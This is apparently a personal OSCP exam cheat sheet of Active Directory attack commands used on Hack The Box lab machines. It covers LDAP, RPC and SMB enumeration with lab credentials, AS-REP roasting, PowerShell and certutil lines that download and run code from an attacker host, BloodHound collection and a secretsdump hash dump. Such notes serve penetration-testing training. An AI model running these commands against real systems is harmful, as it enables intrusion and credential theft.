# OSCP Note


## DNS Enum:
```
dig  @10.10.10.161 htb.local
=> Asign: dig  @10.10.10.161 forest.htb.local
```
## Ldap Enum:
```
ldapsearch -x -H ldap://10.10.10.175 -s base namingcontexts
ldapsearch -H ldap://10.10.10.192 -x -b "DC=BLACKFIELD,DC=local"

Advance:

ldapsearch -H ldap://10.10.10.192 -D cn=support,dc=blackfield,dc=local -w '#00^BlackKnight' -x -b 'dc=blackfield,dc=local'
ldapsearch -H ldap://10.10.10.192 -b "DC=BLACKFIELD,DC=local" -D 'support@blackfield.local' -w '#00^BlackKnight' > support_ldap_dump (With Cred)

ldapsearch -H ldap://hope.windcorp.htb -b "DC=WINDCORP,DC=HTB" sAMAccountName "CN=Users,DC=windcorp,DC=HTB" | grep sAMAccountName | awk '{print $2}' > domainusers (Domain Users Enum)

ldapsearch -h 10.10.10.182 -x -b "DC=cascade,DC=local" > ldap-anonymous
ldapsearch -h 10.10.10.182 -x -b "DC=cascade,DC=local" '(objectClass=person)' > ldap-people
```
## RPC Enum
```
rpcclient -U "" -N 10.10.10.161

Example:
    enumdomusers
    enumdomgroups
    querygroup 0x200
    querygroupmem 0x200
```

## AS-Rep Roasting Enum
```
for user in $(cat users); do GetNPUsers.py -no-pass -dc-ip 10.10.10.161 htb/${user} | grep -v Impacket; done
```

## SMB Enum
```
Enum:

smbmap -H 10.10.10.161
smbmap -H 10.10.10.161 -u ''
smbmap -H 10.10.10.161 -u 'null'
smbmap -H 10.10.10.161 -u svc-alfresco -p s3rvice -R IPC$

Login:
smbclient \\\\10.10.10.161\\IPC$ -U 'svc-alfresco%s3rvice'

```

## Windows
### Download File with Powershell
```
IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.8/SharpHound/ps1') (Download and run script)
```


## PE
### Windows
#### Enum
```
tasklist /svc
```
#### BloodHound
```
certutil.exe -urlcache -f http://10.0.0.5/40564.exe bad.exe
IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.8/SharpHound/ps1');Invoke-BloodHound (Just for .ps1)

We can use BloodHound Python to PE with a normal creds If u dont have a shell:
bloodhound-python -c ALL -u support -p '#00^BlackKnight' -d blackfield.local -dc dc01.blackfield.local -ns 10.10.10.192
```

#### Dump Hash (Generetic PE)
```
secretsdump.py svc-alfresco:s3rvice@10.10.10.161
```
